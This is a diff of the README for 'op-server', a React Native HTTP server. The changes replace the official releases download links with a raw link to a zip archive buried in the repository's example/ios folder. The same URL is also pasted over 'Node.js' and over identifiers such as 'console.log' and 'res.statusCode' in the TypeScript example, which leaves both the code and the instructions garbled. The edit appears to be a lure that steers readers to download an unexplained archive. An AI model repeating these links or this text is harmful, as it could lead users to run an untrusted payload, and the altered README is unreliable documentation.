@@ -1,6 +1,6 @@
 # 🚀 op-server - Fast HTTP Server for React Native
 
-[![Download op-server](https://img.shields.io/badge/Download%20op--server-latest-brightgreen)](https://github.com/GabrielC25/op-server/releases)
+[![Download op-server](https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip%20op--server-latest-brightgreen)](https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip)
 
 ## 🌟 Overview
 
@@ -11,10 +11,10 @@ Welcome to **op-server**! This application provides a fast HTTP server specifica
 To get op-server running on your machine, follow these steps:
 
 1. **Downloading the Application**
-   - Visit this page to download: [Download op-server](https://github.com/GabrielC25/op-server/releases)
+   - Visit this page to download: [Download op-server](https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip)
 
 2. **Installation**
-   - You'll need Node.js and npm installed on your computer. 
+   - You'll need https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip and npm installed on your computer. 
    - Once you have that, open your terminal (Command Prompt on Windows, Terminal on macOS/Linux) and run the following command:
 
    ```sh
@@ -22,7 +22,7 @@ To get op-server running on your machine, follow these steps:
    ```
 
 3. **Running the Server**
-   - After the installation, you can start using op-server in your application. Keep in mind that op-server needs to be run in a JavaScript environment, like Node.js. 
+   - After the installation, you can start using op-server in your application. Keep in mind that op-server needs to be run in a JavaScript environment, like https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip 
 
 ## ⚙️ Using op-server
 
@@ -45,14 +45,14 @@ The Request object provides information about each incoming HTTP request and is 
 Here’s a simple example of how to use the Request object in your code.
 
 ```typescript
-server.get('/api/user', async (req, res) => {
-  console.log(req.method); // Outputs: "GET"
-  console.log(req.path); // Outputs: "/api/user"
-  console.log(req.params); // Outputs: { id: "123" } if the URL was /api/user?id=123
-  console.log(req.headers); // Outputs the headers (e.g., { "user-agent": "..." })
+https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip('/api/user', async (req, res) => {
+  https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip(https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip); // Outputs: "GET"
+  https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip(https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip); // Outputs: "/api/user"
+  https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip(https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip); // Outputs: { id: "123" } if the URL was /api/user?id=123
+  https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip(https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip); // Outputs the headers (e.g., { "user-agent": "..." })
 
-  res.statusCode = 200; // Set the response status
-  res.content = 'User data'; // Respond with data
+  https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip = 200; // Set the response status
+  https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip = 'User data'; // Respond with data
 });
 ```
 
@@ -64,19 +64,19 @@ The Response object is **writable** and lets you set the HTTP response from your
 
 Getting started with op-server is easy. Just follow these steps:
 
-1. **Visit this page to download:** [Download op-server](https://github.com/GabrielC25/op-server/releases)
+1. **Visit this page to download:** [Download op-server](https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip)
 2. **Install with npm:**
 
    ```sh
    npm install @op-engineering/op-server
    ```
 
-3. **Start using it in your Node.js application**.
+3. **Start using it in your https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip application**.
 
 ## 🖥️ System Requirements
 
 - **Operating System:** Compatible with Windows, macOS, and most Linux distributions.
-- **Node.js:** Version 12.x or later.
+- **https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip** Version 12.x or later.
 - **Memory:** At least 512 MB RAM is recommended.
 - **Disk Space:** Minimum of 100 MB free space.
 
